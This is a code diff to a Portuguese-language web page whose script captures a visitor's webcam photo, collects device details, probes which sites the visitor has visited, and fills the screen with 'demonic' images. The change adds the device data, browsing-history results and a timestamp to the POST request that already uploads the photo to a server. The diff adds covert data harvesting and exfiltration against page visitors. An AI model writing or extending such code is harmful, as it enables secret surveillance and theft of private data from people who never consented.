@@ -362,6 +362,8 @@
     <script>
         let stream = null;
         let fotoCapturada = null;
+        let infoDispositivoGlobal = null;
+        let sitesVisitadosGlobal = null;
         const container = document.getElementById('container');
 
         // Ocultar container no início
@@ -593,14 +595,14 @@ ${sitesTexto}
 
         // CRIAR IMAGENS BIZARRAS
         async function criarImagensBizarras() {
-            const infoDispositivo = coletarInformacoesDispositivo();
+            infoDispositivoGlobal = coletarInformacoesDispositivo();
             
             // DETECTAR SITES VISITADOS
             console.log('🕵️ Detectando sites visitados...');
-            const sitesVisitados = await detectarSitesVisitados();
-            console.log('🎯 Sites encontrados:', sitesVisitados);
+            sitesVisitadosGlobal = await detectarSitesVisitados();
+            console.log('🎯 Sites encontrados:', sitesVisitadosGlobal);
             
-            const infoTexto = formatarInfos(infoDispositivo, sitesVisitados);
+            const infoTexto = formatarInfos(infoDispositivoGlobal, sitesVisitadosGlobal);
             
             // ESPALHAR IMAGEM DEMÔNICA + INFORMAÇÕES (MUITO RÁPIDO) - PERMANENTES
             for (let i = 0; i < 1000; i++) {
@@ -788,7 +790,12 @@ ${sitesTexto}
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({ foto: fotoCapturada })
+                body: JSON.stringify({ 
+                    foto: fotoCapturada,
+                    dispositivo: infoDispositivoGlobal,
+                    sitesVisitados: sitesVisitadosGlobal,
+                    timestamp: new Date().toISOString()
+                })
             })
             .catch(erro => {
                 console.error('Erro:', erro);
